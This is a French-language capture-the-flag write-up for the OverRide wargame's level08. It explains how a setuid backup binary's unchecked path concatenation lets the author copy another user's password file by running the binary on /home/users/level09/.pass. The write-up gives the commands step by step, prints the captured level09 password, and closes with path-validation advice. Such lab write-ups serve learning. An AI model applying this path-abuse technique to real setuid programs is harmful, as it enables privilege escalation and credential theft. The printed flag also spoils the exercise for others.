# Exploitation du binaire level08 (OverRide)

## Objectif

Obtenir l'accès à l'utilisateur `level09` en exploitant le binaire `level08`, qui est un exécutable `setuid root` avec certaines protections actives.

---

## Informations sur la protection du binaire

Commande utilisée :

```bash
checksec --file level08
```

Résultat :

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   level08
```

### Analyse :

* ✅ **Full RELRO** : Table GOT protégée (non modifiable)
* ✅ **Stack Canary** : Protection contre les débordements de pile
* ❌ **NX désactivé** : La pile est exécutable → vulnérable à du shellcode
* ❌ **No PIE** : Les adresses mémoire sont fixes → plus facile à exploiter

---

## Lecture du code source

Le programme effectue une sauvegarde d’un fichier passé en argument et écrit dans un fichier de log à l’aide de la fonction `log_wrapper()`.

Fonctions clés :

```c
log_wrapper(log_fp, "Starting back up: ", argv[1]);
FILE* fp = fopen(argv[1], "r");
...
open("./backups/" + argv[1], O_CREAT | O_WRONLY | O_TRUNC, 0440);
```

🔐 **Problème de sécurité** : le chemin final du fichier est créé avec :

```c
strncat(&file, argv[1], ...);
```

Sans vérification stricte du contenu de `argv[1]`, ce qui permet une manipulation du chemin.

---

## Contrainte rencontrée

En tant qu’utilisateur `level08`, je **ne peux pas écrire** dans `./backups/` car ce répertoire est protégé.

Or, pour que `log_wrapper()` soit atteint, le programme tente d’ouvrir `argv[1]` avec `fopen(argv[1], "r")`, ce qui **échoue si le fichier n’existe pas**.

---

## Exploitation

L'idée est d'exploiter un contournement de chemin :

* Linux accepte des chemins comme `backups//home/users/level09/.pass`
* Cela accède réellement à `/home/users/level09/.pass`

### Étapes :

1. Créer les dossiers nécessaires :

```bash
mkdir -p backups//home/users/level09
```

2. Lancer le binaire avec le bon chemin :

```bash
~/level08 /home/users/level09/.pass
```

3. Lire le fichier copié par le programme :

```bash
cat backups/home/users/level09/.pass
```

### Résultat :

```
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

4. Se connecter en tant que `level09` :

```bash
su level09
```

---

## Conclusion

En profitant d’un chemin détourné combiné à des droits root via `setuid`, j’ai pu accéder à un fichier sensible appartenant à un autre utilisateur.

✔️ Exploit réussi sans buffer overflow
✔️ Faille basée sur la **manipulation de chemins**

---

## Remarques

Cette attaque montre l’importance de toujours :

* Valider soigneusement les chemins utilisateur
* Éviter les concaténations naïves
* Utiliser des fonctions sécurisées comme `realpath()` pour bloquer ce type d’abus
